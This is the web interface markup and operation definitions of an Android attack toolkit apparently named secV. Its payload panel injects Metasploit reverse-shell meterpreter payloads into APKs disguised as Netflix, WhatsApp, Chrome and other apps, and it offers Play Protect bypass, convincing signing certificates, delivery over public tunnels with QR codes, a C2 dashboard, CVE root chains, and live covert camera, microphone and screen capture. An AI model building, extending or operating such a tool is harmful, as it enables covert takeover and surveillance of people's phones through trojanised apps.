        <button class="tt-btn" id="pty-start-btn" onclick="startPty()">▶ start</button>
        <button class="tt-btn" onclick="ptyKill()">✕ kill</button>
        <div class="tt-sep"></div>
        <button class="tt-btn" onclick="ptyInputSend('sudo -i\n')">sudo</button>
        <button class="tt-btn" onclick="ptyInputSend('exit\n')">exit</button>
        <div class="tt-sep"></div>
        <button class="tt-btn" onclick="clearPty()">clear</button>
        <button class="tt-btn active" id="pty-scroll-btn" onclick="togglePtyScroll()">⬇ lock</button>
        <span id="pty-info"></span>
      </div>
      <div id="pty-input-row">
        <span id="pty-prompt-label"><span class="ppl-brand">secV</span><span class="ppl-sep"> ❯ </span><span class="ppl-caret">$</span>&nbsp;</span>
        <input id="pty-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
          placeholder="enter command  ·  ↑↓ history  ·  Enter send"
          onkeydown="ptyKeyDown(event)">
      </div>
      <div id="pty-output"></div>
    </div>
    <!-- FINDINGS TAB -->
    <div id="findings-panel">
      <div id="f-toolbar">
        <span class="f-tab active" data-ftab="summary" onclick="fTab('summary')">Summary</span>
        <span class="f-tab" data-ftab="vulns" onclick="fTab('vulns')">Vulns <span id="f-vuln-ct" class="badge" style="display:none">0</span></span>
        <span class="f-tab" data-ftab="device" onclick="fTab('device')">Device</span>
        <span class="f-tab" data-ftab="apps" onclick="fTab('apps')">Apps</span>
        <span class="f-tab" data-ftab="delivery" onclick="fTab('delivery')">Delivery</span>
        <span class="f-tab" data-ftab="raw" onclick="fTab('raw')">Raw JSON</span>
        <div class="f-actions">
          <button class="f-action-btn" onclick="exportFindings()">↓ export</button>
          <button class="f-action-btn" onclick="clearFindings()">✕ clear</button>
        </div>
      </div>
      <div id="f-body"><div id="f-empty" style="padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;">Run an operation — findings populate here automatically.</div></div>
    </div>
    <!-- PAYLOAD & DELIVERY TAB — unified mod menu -->
    <div id="pd-panel">

      <div class="pd-toolbar">
        <span class="pd-toolbar-title">P&amp;D</span>
        <span id="pd-apk-badge" class="pd-status-badge" style="display:none"></span>
        <div style="flex:1"></div>
        <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
        <button class="pd-btn" onclick="switchTab('msf-console')">⬛ console</button>
        <button class="pd-btn" onclick="pdRefreshSessions();pdRefreshMsfSessions()">⟳</button>
      </div>

      <div class="pd-body">

        <!-- SOURCE ─── -->
        <div class="pm-row">
          <div class="pm-lbl">APK Source</div>
          <div class="pm-chips" id="pm-src-chips">
            <label class="pm-chip sel"><input type="radio" name="pd-src" value="local" checked onchange="pdFormUpd()">Local file</label>
            <label class="pm-chip"><input type="radio" name="pd-src" value="netflix" onchange="pdFormUpd()">Netflix</label>
            <label class="pm-chip"><input type="radio" name="pd-src" value="whatsapp" onchange="pdFormUpd()">WhatsApp</label>
            <label class="pm-chip"><input type="radio" name="pd-src" value="instagram" onchange="pdFormUpd()">Instagram</label>
            <label class="pm-chip"><input type="radio" name="pd-src" value="chrome" onchange="pdFormUpd()">Chrome</label>
            <label class="pm-chip"><input type="radio" name="pd-src" value="tiktok" onchange="pdFormUpd()">TikTok</label>
            <label class="pm-chip"><input type="radio" name="pd-src" value="device" onchange="pdFormUpd()">Pull from device</label>
            <label class="pm-chip"><input type="radio" name="pd-src" value="standalone" onchange="pdFormUpd()">Standalone · PoisonIvy</label>
          </div>
          <!-- local / template: path field -->
          <div class="pm-sub show" id="pm-sub-path">
            <div class="pm-inrow">
              <div class="pm-col" style="flex:3"><div class="field"><label>APK path</label><input id="pd-apk-path" type="text" placeholder="~/.secv/android/auto/.../app.apk" oninput="pdCheckApkStatus()"></div></div>
              <div style="display:flex;align-items:flex-end;gap:5px">
                <button class="pd-btn" onclick="pdAutoFillApk()">auto-fill</button>
                <button class="pd-btn" onclick="pdBrowseClick()">browse</button>
              </div>
            </div>
          </div>
          <!-- device: pull package -->
          <div class="pm-sub" id="pm-sub-device">
            <div class="pm-inrow">
              <div class="pm-col"><div class="field"><label>Target package</label><input id="pd-pkg-pull" type="text" placeholder="com.target.app"></div></div>
              <div style="display:flex;align-items:flex-end"><button class="pd-btn accent" onclick="pdPullApk()">▼ pull APK</button></div>
            </div>
          </div>
          <!-- standalone: output name -->
          <div class="pm-sub" id="pm-sub-standalone">
            <div class="pm-inrow">
              <div class="pm-col"><div class="field"><label>Output filename</label><input id="pd-standalone-name" type="text" value="payload.apk"></div></div>
            </div>
          </div>
        </div>

        <!-- PAYLOAD ─── -->
        <div class="pm-row">
          <div class="pm-lbl">Payload</div>
          <div class="pm-inrow">
            <div class="pm-col" style="flex:2">
              <div class="field"><label>Type</label>
                <select id="pd-payload">
                  <option value="tcp">reverse_tcp — meterpreter (LAN)</option>
                  <option value="http">reverse_http — meterpreter (WAN HTTP)</option>
                  <option value="https">reverse_https — meterpreter (WAN stealth)</option>
                  <option value="bind">bind_tcp — meterpreter (no inbound)</option>
                </select>
              </div>
            </div>
            <div class="pm-col"><div class="field"><label>LHOST</label><input id="pd-lhost" type="text" placeholder="auto-detect"></div></div>
            <div style="min-width:80px"><div class="field"><label>LPORT</label><input id="pd-lport" type="text" value="4444" style="width:100%"></div></div>
          </div>
        </div>

        <!-- OPTIONS ─── -->
        <div class="pm-row">
          <div class="pm-lbl">Options</div>
          <div class="pm-chk-row">
            <label class="pm-chk"><input type="checkbox" id="pd-tog-pp" onchange="pdToggle()"> Bypass Play Protect</label>
            <label class="pm-chk"><input type="checkbox" id="pd-tog-id" onchange="pdToggle()"> Custom Identity / APK skin</label>
            <label class="pm-chk"><input type="checkbox" id="pd-tog-sign"> Convincing Cert CN</label>
          </div>
          <div id="pd-id-fields" style="display:none;flex-wrap:wrap;gap:8px;padding-top:8px;">
            <div class="pm-col"><div class="field"><label>Icon URL / path</label><input id="pd-icon" type="text" placeholder="https://… or /path/icon.png"></div></div>
            <div class="pm-col"><div class="field"><label>App Label</label><input id="pd-app-label" type="text" placeholder="Netflix"></div></div>
            <div class="pm-col"><div class="field"><label>Package Name</label><input id="pd-pkg-name" type="text" placeholder="com.netflix.mediastream"></div></div>
          </div>
        </div>

        <!-- DELIVERY ─── -->
        <div class="pm-row">
          <div class="pm-lbl">Delivery</div>
          <div class="pm-chips" id="pm-dlv-chips">
            <label class="pm-chip sel"><input type="radio" name="pd-dlv" value="none" checked onchange="pdFormUpd()">Build only</label>
            <label class="pm-chip"><input type="radio" name="pd-dlv" value="adb-usb" onchange="pdFormUpd()">🔌 ADB · USB</label>
            <label class="pm-chip"><input type="radio" name="pd-dlv" value="adb-net" onchange="pdFormUpd()">📡 ADB · Network</label>
            <label class="pm-chip"><input type="radio" name="pd-dlv" value="lan" onchange="pdFormUpd()">🏠 LAN HTTP</label>
            <label class="pm-chip"><input type="radio" name="pd-dlv" value="wan" onchange="pdFormUpd()">🌐 WAN HTTPS</label>
          </div>
          <!-- ADB network: IP -->
          <div class="pm-sub" id="pm-sub-adb-net">
            <div class="pm-inrow">
              <div class="pm-col"><div class="field"><label>Device IP:Port</label><input id="pd-adb-ip" type="text" placeholder="192.168.x.x:5555"></div></div>
              <div style="display:flex;align-items:flex-end;gap:5px">
                <button class="pd-btn accent" onclick="pdAdbConnect()">connect</button>
              </div>
            </div>
          </div>
          <!-- LAN: port -->
          <div class="pm-sub" id="pm-sub-lan">
            <div class="pm-inrow">
              <div style="min-width:120px"><div class="field"><label>Port</label><input id="pd-lan-port" type="text" value="8891"></div></div>
              <div style="display:flex;align-items:flex-end"><button class="pd-btn" onclick="pdGenQR('lan')">QR</button></div>
            </div>
            <div id="pd-lan-url" class="pd-url-box" style="display:none"></div>
          </div>
          <!-- WAN: tunnel + port -->
          <div class="pm-sub" id="pm-sub-wan">
            <div class="pm-inrow">
              <div class="pm-col">
                <div class="field"><label>Tunnel</label>
                  <select id="pd-tunnel">
                    <option value="lhr">localhost.run (HTTPS · SSH 22)</option>
                    <option value="bore">bore.pub (TCP high port)</option>
                    <option value="cloudflared">cloudflared</option>
                  </select>
                </div>
              </div>
              <div style="min-width:100px"><div class="field"><label>Local Port</label><input id="pd-wan-port" type="text" value="8891"></div></div>
              <div style="display:flex;align-items:flex-end;gap:5px">
                <button class="pd-btn danger" onclick="pdWanStop()">■ stop</button>
                <button class="pd-btn" onclick="pdGenQR('wan')">QR</button>
              </div>
            </div>
            <div id="pd-wan-url" class="pd-url-box" style="display:none"></div>
            <div class="pd-act-row" id="pd-wan-copy-row" style="display:none">
              <button class="pd-btn" onclick="pdCopyEl('pd-wan-url')">copy URL</button>
              <button class="pd-btn" onclick="pdUpdateSite()">update APK site</button>
            </div>
          </div>
        </div>

        <!-- ACTION ─── -->
        <div class="pm-action">
          <button class="pm-go" id="pd-action-btn" onclick="pdAction()">▶ BUILD &amp; INJECT</button>
          <button class="pd-btn accent" style="padding:12px 16px;" onclick="pdStartHandler()">⚡ handler</button>
          <button class="pd-btn" style="padding:12px 11px;" onclick="pdAdbGrant()" title="Grant permissions to installed APK">perms</button>
          <button class="pd-btn" style="padding:12px 11px;" onclick="pdAdbLaunch()" title="Launch installed app">launch</button>
        </div>
        <div id="pd-build-log" class="pd-log" style="display:none"></div>

        <!-- STATUS ─── -->
        <div class="pm-row" id="pd-apk-status-card">
          <div class="pm-lbl">Payload Status</div>
          <div class="pd-info" id="pd-apk-ready-msg">No payload built yet — configure above and hit GO.</div>
          <div id="pd-deliver-apk-row" style="display:none">
            <div class="pd-url-box" id="pd-deliver-apk-path"></div>
            <div class="pd-act-row" style="margin-top:6px">
              <button class="pd-btn" onclick="pdCopyEl('pd-deliver-apk-path')">copy path</button>
              <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
              <button class="pd-btn" onclick="pdGenQR('lan')">QR</button>
            </div>
          </div>
        </div>

        <!-- DELIVERY LOG ─── -->
        <div class="pm-row" id="pd-deliver-log-sect">
          <div class="pm-lbl">Delivery Log</div>
          <div id="pd-deliver-log" class="pd-log" style="min-height:44px">Delivery output appears here.</div>
        </div>

        <!-- QR & URLS ─── -->
        <div class="pm-row">
          <div class="pm-lbl">URLs &amp; QR</div>
          <div id="pdv-qr-area" class="pd-qr-area">
            <div class="pd-info" style="flex:1">Run LAN Serve or WAN Expose to generate links.</div>
          </div>
        </div>

        <!-- SESSIONS ─── -->
        <div class="pm-row">
          <div class="pm-lbl">Sessions</div>
          <div class="pd-sess-grid">
            <div class="pd-fcard">
              <div style="font-size:0.55rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:7px;">secV</div>
              <div id="pdv-secv-list" class="pd-sess-list"><div class="pd-info">No active sessions.</div></div>
              <div class="pd-act-row">
                <button class="pd-btn" onclick="pdRefreshSessions()">⟳ refresh</button>
                <button class="pd-btn danger" onclick="pdKillAll()">✕ kill all</button>
              </div>
            </div>
            <div class="pd-fcard">
              <div style="font-size:0.55rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:7px;">MSF Meterpreter</div>
              <div id="pdv-msf-list" class="pd-sess-list"><div class="pd-info">Start msfconsole to see sessions.</div></div>
              <div class="pd-act-row">
                <button class="pd-btn" onclick="pdRefreshMsfSessions()">⟳ refresh</button>
                <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
                <button class="pd-btn" onclick="switchTab('msf-console')">⬛ terminal</button>
              </div>
            </div>
          </div>
        </div>

        <!-- OP LOG ─── -->
        <div class="pm-row">
          <div class="pm-lbl">Last Op Output</div>
          <div id="pdv-op-log" class="pd-log" style="min-height:54px">No output yet.</div>
        </div>

      </div><!-- /pd-body -->
    </div><!-- /pd-panel -->

    <!-- MSF CONSOLE TAB -->
    <div id="msf-console-panel">
      <div class="msfc-toolbar">
        <div id="msf2-dot"></div>
        <span id="msf2-status">offline</span>
        <div class="tt-sep"></div>
        <button class="pd-btn" onclick="startMsfConsole()">▶ start msfconsole</button>
        <button class="pd-btn" onclick="stopMsf()">■ stop</button>
        <div class="tt-sep"></div>
        <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
        <button class="pd-btn" onclick="msfSend2('sessions -l')">sessions</button>
        <button class="pd-btn" onclick="msfSend2('sessions -i 1')">interact 1</button>
        <button class="pd-btn" onclick="msfSend2('sysinfo')">sysinfo</button>
        <button class="pd-btn" onclick="msfSend2('screenshot')">screenshot</button>
        <button class="pd-btn" onclick="msfSend2('shell')">shell</button>
        <div class="tt-sep"></div>
        <button class="pd-btn" onclick="clearMsf2()">⌧ clear</button>
        <button class="pd-btn" onclick="switchTab('pd');pdNav(\'sessions\')">→ sessions</button>
        <span id="msf2-sess-ct" style="margin-left:auto;font-size:0.58rem;color:var(--muted);letter-spacing:0.06em;"></span>
      </div>
      <div id="msf2-terminal"></div>
      <div id="msf2-input-row">
        <span id="msf2-prompt">msf6&gt;&nbsp;</span>
        <input id="msf2-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
          placeholder="sessions -l  ·  sessions -i 1  ·  use exploit/multi/handler  ·  run -j"
          onkeydown="msf2Enter(event)">
      </div>
    </div>

    <!-- FILES TAB -->
    <div id="files-panel">
      <div id="fm-toolbar">
        <span style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-right:4px;">Host</span>
        <button class="fm-tb-btn" onclick="fmHostNav(fmHostPath)">⟳ refresh</button>
        <button class="fm-tb-btn" onclick="fmHostNav(document.getElementById('fm-host-path-inp').value||fmHostPath)">⏎ go</button>
        <input id="fm-host-path-inp" type="text" style="flex:1;min-width:120px;max-width:320px;background:var(--bg2);border:1px solid var(--border2);color:var(--white);font-family:var(--mono);font-size:0.65rem;padding:4px 8px;" placeholder="/home/..." onkeydown="if(event.key==='Enter')fmHostNav(this.value)">
        <button class="fm-tb-btn" onclick="fmMkdir('host')">+ folder</button>
        <button class="fm-tb-btn go" onclick="fmUploadClick()">⬆ upload</button>
        <input id="fm-upload-inp" type="file" style="display:none" onchange="fmUploadFile(this)">
        <span style="font-size:0.6rem;color:var(--border2);margin:0 4px;">│</span>
        <span style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-right:4px;">Device</span>
        <button class="fm-tb-btn" onclick="fmDevNav(fmDevPath)">⟳ refresh</button>
        <button class="fm-tb-btn" onclick="fmPullApkDialog()">⬇ pull APK</button>
        <button class="fm-tb-btn" onclick="fmDevNav('/sdcard')">/ sdcard</button>
        <button class="fm-tb-btn" onclick="fmDevNav('/data/app')">/ data</button>
      </div>
      <div id="fm-body">
        <!-- Host pane -->
        <div class="fm-pane" id="fm-host-pane">
          <div class="fm-pane-hdr">
            <span class="fm-pane-title">Host</span>
            <span id="fm-host-count" style="margin-left:auto;font-size:0.58rem;"></span>
          </div>
          <div class="fm-breadcrumb" id="fm-host-bc"></div>
          <div class="fm-list" id="fm-host-list"></div>
          <div class="fm-status" id="fm-host-status"></div>
        </div>
        <!-- Device pane -->
        <div class="fm-pane" id="fm-dev-pane">
          <div class="fm-pane-hdr">
            <span class="fm-pane-title">Device</span>
            <span id="fm-dev-count" style="margin-left:auto;font-size:0.58rem;"></span>
          </div>
          <div class="fm-breadcrumb" id="fm-dev-bc"></div>
          <div class="fm-list" id="fm-dev-list">
            <div class="fm-empty">Connect a device and click ⟳ to browse</div>
          </div>
          <div class="fm-status" id="fm-dev-status"></div>
        </div>
        <!-- Preview pane -->
        <div id="fm-preview">
          <div id="fm-preview-hdr">Preview</div>
          <div id="fm-preview-content"><div style="color:var(--muted);font-size:0.65rem;padding:16px;">Select a file to preview</div></div>
        </div>
      </div>
      <!-- context menu -->
      <div id="fm-ctx" class="fm-ctx" style="display:none;"></div>
    </div>
    <!-- SETUP TAB -->
    <div id="setup-panel">
      <div style="color:var(--muted);font-size:0.68rem;margin-bottom:8px;letter-spacing:0.02em;">Global defaults applied to all operations. Dependency status auto-detected.</div>
      <div style="color:var(--grey);font-size:0.58rem;margin-bottom:6px;letter-spacing:0.18em;text-transform:uppercase;">Global Settings</div>
      <div class="settings-grid">
        <div class="field"><label>LHOST (attacker IP)</label><input id="s-lhost" type="text" placeholder="auto-detect"></div>
        <div class="field"><label>LPORT</label><input id="s-lport" type="text" value="4444"></div>
        <div class="field"><label>Bore server</label><input id="s-bore" type="text" value="bore.pub"></div>
        <div class="field"><label>NVD API key</label><input id="s-nvd" type="text" placeholder="optional"></div>
        <div class="field"><label>C2 host</label><input id="s-c2host" type="text" placeholder="auto-detect"></div>
        <div class="field"><label>C2 port</label><input id="s-c2port" type="text" value="8889"></div>
      </div>
      <button id="save-settings" onclick="saveSettings()">💾 Save settings</button>
      <button class="tb-btn" style="margin-left:8px;margin-top:8px;" onclick="detectLhost()">⟳ Auto-detect LHOST</button>
      <div style="display:flex;align-items:center;gap:8px;margin:12px 0 6px;">
        <div style="color:var(--grey);font-size:0.58rem;letter-spacing:0.18em;text-transform:uppercase;font-weight:700;">Dependencies</div>
        <span id="dep-pkgmgr" style="display:none;font-family:var(--mono);font-size:0.55rem;letter-spacing:0.1em;padding:1px 7px;border:1px solid var(--cat-c2);color:var(--cat-c2);text-transform:uppercase;"></span>
      </div>
      <div id="dep-grid" class="dep-grid">
        <div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;">Loading…</div>
      </div>
    </div>
    <!-- LIVE MEDIA PANEL -->
    <div id="live-panel">
      <!-- Screen Mirror -->
      <div class="live-section">
        <div class="live-section-hdr">
          <div class="live-dot" id="screen-dot"></div>
          <div class="live-label">Screen Mirror</div>
          <select class="live-select" id="screen-source" style="width:88px;">
            <option value="adb">ADB Live</option>
            <option value="msf">MSF snap</option>
          </select>
          <input class="live-input" id="msf-session-inp" type="text" value="1" placeholder="session #" style="width:50px;display:none;" title="Meterpreter session ID">
          <button class="live-btn go" id="screen-start-btn" onclick="startScreen()">▶ Start</button>
          <button class="live-btn active" onclick="stopScreen()" style="display:none" id="screen-stop-btn">■ Stop</button>
          <button class="live-btn" onclick="snapScreen()">⬡ Snap</button>
          <button class="live-btn" onclick="detectScreenSize()" title="Detect device screen size">⟳ Size</button>
          <span id="screen-fps" style="font-size:0.58rem;color:var(--muted);margin-left:4px;letter-spacing:0.06em;"></span>
          <span id="screen-dims" style="font-size:0.55rem;color:var(--grey3);margin-left:4px;letter-spacing:0.06em;"></span>
        </div>
        <div id="screen-wrap">
          <div id="screen-placeholder">Screen mirror off — click ⟳ Size to detect dimensions, then ▶ Start</div>
          <img id="screen-img" alt="screen" />
          <div id="screen-overlay">● LIVE</div>
          <div id="screen-source-badge" style="position:absolute;bottom:6px;right:6px;font-size:0.5rem;letter-spacing:0.12em;color:var(--muted);text-transform:uppercase;display:none;background:rgba(0,0,0,0.6);padding:2px 7px;"></div>
        </div>
      </div>

      <!-- Camera + Audio -->
      <div class="live-grid">
        <!-- Camera -->
        <div class="live-section">
          <div class="live-section-hdr">
            <div class="live-dot" id="cam-dot"></div>
            <div class="live-label">Camera</div>
            <select class="live-select" id="cam-id">
              <option value="0">Back</option>
              <option value="1">Front</option>
            </select>
            <button class="live-btn" onclick="camSnap()">⬡ Snap</button>
            <button class="live-btn go" onclick="startCamAdb()" title="ADB screencap loop (no payload needed)">▶ ADB</button>
            <button class="live-btn" onclick="startCamStream()" title="Requires: webcam_stream in MSF session">▶ MSF</button>
            <input class="live-input" id="cam-port" type="text" value="8880" placeholder="port" style="width:46px;">
            <button class="live-btn active" onclick="stopCam()" id="cam-stop-btn" style="display:none">■</button>
          </div>
          <div class="camera-wrap">
            <div id="camera-placeholder">Camera off — ADB (no payload) or MSF (webcam_stream)</div>
            <img id="camera-img" alt="camera" />
          </div>
        </div>

        <!-- Audio -->
        <div class="live-section">
          <div class="live-section-hdr">
            <div class="live-dot" id="audio-dot"></div>
            <div class="live-label">Audio</div>
          </div>
          <!-- Microphone -->
          <div class="audio-row">
            <span class="audio-label">Mic</span>
            <div id="mic-visualizer"></div>
            <button class="live-btn" id="mic-btn" onclick="toggleMic()">▶ ADB</button>
            <button class="live-btn" id="mic-msf-btn" onclick="msfMicRec()" title="record_mic via Meterpreter session">▶ MSF</button>
            <select class="live-select" id="mic-dur">
              <option value="3">3s</option>
              <option value="5" selected>5s</option>
              <option value="10">10s</option>
            </select>
          </div>
          <div style="padding:4px 14px 8px;">
            <audio id="mic-audio" controls style="width:100%;height:28px;display:none;"></audio>
            <div id="mic-status" style="font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;margin-top:4px;">Idle</div>
          </div>
          <!-- Speaker -->
          <div class="audio-row">
            <span class="audio-label">Speaker</span>
            <label class="speaker-file" id="spk-label" for="spk-file">Choose audio file…</label>
            <input type="file" id="spk-file" accept="audio/*" style="display:none" onchange="speakerFileChosen(this)">
            <button class="live-btn go" onclick="pushSpeaker()">▶ Push</button>
            <button class="live-btn active" onclick="stopSpeaker()" title="Stop playback on device">■ Stop</button>
          </div>
          <div style="padding:4px 14px 8px;">
            <div id="spk-status" style="font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;">No file selected</div>
          </div>
        </div>
      </div>

      <!-- MSF Meterpreter Console -->
      <div class="live-section">
        <div class="live-section-hdr">
          <div class="live-dot" id="msf-dot"></div>
          <div class="live-label">Meterpreter Console</div>
          <span id="msf-status">offline</span>
          <button class="live-btn go" onclick="startMsf()">▶ Start MSF</button>
          <button class="live-btn active" onclick="stopMsf()">■ Stop</button>
          <button class="live-btn" onclick="msfSend('sessions -l')">sessions</button>
          <button class="live-btn" onclick="msfSend('help')">help</button>
        </div>
        <div id="msf-terminal"></div>
        <div id="msf-input-row">
          <span>msf&gt;&nbsp;</span>
          <input id="msf-input" type="text" placeholder="sessions -i 1; screenshot; webcam_stream -l 0.0.0.0 -p 8880"
                 onkeydown="msfEnter(event)">
        </div>
      </div>
    </div>
    <!-- C2 PANEL -->
    <div id="c2-panel">
      <div id="c2-toolbar">
        <span>port:</span>
        <input id="c2-port-inp" type="text" value="8891">
        <button class="c2-btn launch" onclick="launchC2()">▶ Launch C2</button>
        <button class="c2-btn stop" onclick="stopC2()">✕ Stop</button>
        <span id="c2-status-badge" style="font-size:0.6rem;color:var(--muted);margin-left:6px;letter-spacing:0.06em;"></span>
        <a id="c2-open-link" href="#" target="_blank" style="font-size:0.65rem;letter-spacing:0.06em;display:none;margin-left:4px;">↗ open</a>
      </div>
      <div id="c2-frame-wrap">
        <div id="c2-placeholder">
          <div class="c2-icon">C2</div>
          <div class="c2-title">secV C2 Dashboard</div>
          <div class="c2-hint">Click <b style="color:var(--white)">▶ Launch C2</b> to start.</div>
          <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.08em;text-transform:uppercase;">Sessions · Bore · MSF · QR · Agent Callbacks · Encrypted Logs</div>
        </div>
        <iframe id="c2-iframe" style="display:none;width:100%;height:100%;border:none;" src="" allow="same-origin"></iframe>
      </div>
    </div>
  </div>
</div>

<!-- STATUS BAR -->
<div id="statusbar">
  <div id="status-dot"></div>
  <div id="status-text">idle</div>
  <div id="status-time"></div>
  <div id="workdir-link" onclick="switchTab('files');loadFiles()">~/.secv/android/</div>
  <div id="progress-bar"></div>
</div>

<!-- TOAST CONTAINER -->
<div id="toast-container"></div>

<script>
// ── Operation definitions ─────────────────────────────────────────────────────
const OPS_CATS = {
  "Recon & Analysis":      "recon",
  "Access & Escalation":   "access",
  "Payload & Delivery":    "payload",
  "Instrumentation":       "instr",
  "Persistence":           "persist",
  "C2 & Agent":            "c2",
  "Evasion & Customization":"evasion",
  "Live Media":            "c2",
  "Automated Chains":      "auto",
};

const OPS = {
  "Recon & Analysis": [
    {id:"recon", label:"recon",
     desc:"Device fingerprinting: model, Android ver, root status, SELinux, bootloader, chipset, patch level.",
     cli:"secv android recon",
     fields:[]},
    {id:"app_scan", label:"app scan",
     desc:"Full APK analysis: manifest, permissions, exported components, hardcoded secrets, security score.",
     cli:"secv android app_scan [--package com.target.app] [--deep] [--secrets]",
     fields:[
       {n:"package",p:"",t:"text",label:"Package (blank=all)"},
       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep analysis (jadx)"},
       {n:"search_secrets",p:"true",t:"select",opts:["true","false"],label:"Search secrets"},
       {n:"scan_limit",p:"5",t:"text",label:"App limit"},
       {n:"bypass_ssl",p:"false",t:"select",opts:["false","true"],label:"SSL bypass patch"},
     ]},
    {id:"vuln_scan", label:"vuln scan",
     desc:"Device + app CVE assessment (2019–2026, MediaTek chipsets, NVD live API lookups).",
     cli:"secv android vuln_scan [--package com.target.app] [--nvd-key KEY]",
     fields:[
       {n:"package",p:"",t:"text",label:"Package (blank=all)"},
       {n:"nvd_api_key",p:"",t:"text",label:"NVD API key (optional)"},
     ]},
    {id:"exploit", label:"exploit",
     desc:"Intent injection, SQL injection on content providers, path traversal, exported component abuse.",
     cli:"secv android exploit --package com.target.app",
     fields:[{n:"package",p:"com.target.app",t:"text",label:"Package (required)"}]},
    {id:"network", label:"network",
     desc:"Packet capture (tcpdump via root) + logcat credential leakage analysis.",
     cli:"secv android network [--package com.target.app]",
     fields:[{n:"package",p:"",t:"text",label:"Package (optional)"}]},
    {id:"forensics", label:"forensics",
     desc:"DB/SharedPrefs extraction (root), logcat dump, ADB backup, SQLite inspection.",
     cli:"secv android forensics --package com.target.app [--backup]",
     fields:[
       {n:"package",p:"com.target.app",t:"text",label:"Package (required)"},
       {n:"backup",p:"false",t:"select",opts:["false","true"],label:"ADB backup"},
     ]},
    {id:"device_net_scan", label:"device net scan",
     desc:"Scan device WiFi subnet — detect open ADB TCP ports, web services, other Android devices.",
     cli:"secv android device_net_scan",
     fields:[]},
    {id:"full", label:"full scan",
     desc:"Full chain: recon + app_scan + vuln_scan + exploit + network + forensics in one pass.",
     cli:"secv android full [--package com.target.app] [--deep]",
     fields:[
       {n:"package",p:"",t:"text",label:"Package (blank=all)"},
       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep analysis (jadx)"},
       {n:"search_secrets",p:"true",t:"select",opts:["true","false"],label:"Search secrets"},
     ]},
  ],
  "Access & Escalation": [
    {id:"adb_wifi", label:"adb wifi",
     desc:"Enable ADB over TCP/WiFi (adb tcpip 5555) — drop the USB cable.",
     cli:"secv android adb_wifi [--adb-port 5555]",
     fields:[{n:"adb_port",p:"5555",t:"text",label:"ADB TCP port"}]},
    {id:"get_root", label:"get root",
     desc:"Multi-vector root: Magisk su → adb root → CVE-2024-0044 → mtk-su → KernelSU fallback.",
     cli:"secv android get_root",
     fields:[]},
    {id:"exploit_cve", label:"exploit CVE",
     desc:"Targeted single-CVE exploitation. Supported: CVE-2024-0044 (install-bypass), CVE-2023-45866 (Bluetooth HID), CVE-2024-31317.",
     cli:"secv android exploit_cve --cve CVE-2024-0044",
     fields:[
       {n:"cve",p:"CVE-2024-0044",t:"select",
        opts:["CVE-2024-0044","CVE-2023-45866","CVE-2024-31317"],label:"CVE ID"},
     ]},
    {id:"cve_chain", label:"CVE chain",
     desc:"Multi-CVE chain: bt_to_root, sandbox_exfil, zero_click_full, or custom comma-separated list.",
     cli:"secv android cve_chain --chain bt_to_root",
     fields:[
       {n:"chain",p:"bt_to_root",t:"select",
        opts:["bt_to_root","sandbox_exfil","zero_click_full","custom"],label:"Chain preset"},
       {n:"chain_custom",p:"",t:"text",label:"Custom chain (comma-sep CVEs)"},
     ]},
    {id:"zero_click", label:"zero click",
     desc:"Zero-click attack surface probe: Bluetooth HID, NFC NDEF, WiFi broadcast, media parser.",
     cli:"secv android zero_click --vector all",
     fields:[
       {n:"vector",p:"all",t:"select",opts:["all","bt","nfc","wifi","media"],label:"Vector"},
     ]},
  ],
  "Payload & Delivery": [
    {id:"backdoor_apk", label:"backdoor APK",
     desc:"Inject Metasploit payload into an APK — msfvenom -x template pipeline + apktool smali merge + re-sign. Accepts local APK path or pulls from device by package. WAN expose runs after unless disabled.",
     cli:"secv android backdoor_apk --apk-path /path/to/app.apk --lhost LHOST --lport 4444",
     runLabel:"INJECT",
     fields:[
       {n:"apk_path",p:"",t:"text",label:"APK path (local — no device needed)"},
       {n:"package",p:"",t:"text",label:"Package (pull from device)"},
       {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload type"},
       {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install on device after build"},
       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after inject"},
       {n:"serve_port",p:"8891",t:"text",label:"APK HTTP server port"},
     ]},
    {id:"wan_expose", label:"WAN expose",
     desc:"Start WAN tunnel + detached APK HTTP server. Primary: localhost.run SSH tunnel (HTTPS). Fallback: bore → cloudflared. Generates delivery URL + QR.",
     cli:"secv android wan_expose --serve-port 8891 --tunnel localhost.run",
     runLabel:"EXPOSE",
     fields:[
       {n:"serve_port",p:"8891",t:"text",label:"APK HTTP server port"},
       {n:"tunnel",p:"localhost.run",t:"select",opts:["localhost.run","bore","cloudflared"],label:"Tunnel method"},
       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server (bore mode)"},
     ]},
    {id:"qr_exploit", label:"QR / delivery",
     desc:"Generate QR codes for payload delivery: APK URL, Android Intent URI, ADB wireless pairing, deeplink, WAN, or custom string.",
     cli:"secv android qr_exploit --mode wan --apk-path /path/to/app.apk",
     runLabel:"GENERATE",
     fields:[
       {n:"mode",p:"wan",t:"select",opts:["wan","apk","intent","adb_pair","deeplink","custom"],label:"QR mode"},
       {n:"apk_path",p:"",t:"text",label:"APK path (wan/apk modes)"},
       {n:"lhost",p:"",t:"text",label:"LHOST (apk mode)"},
       {n:"lport",p:"8891",t:"text",label:"Serve port (apk mode)"},
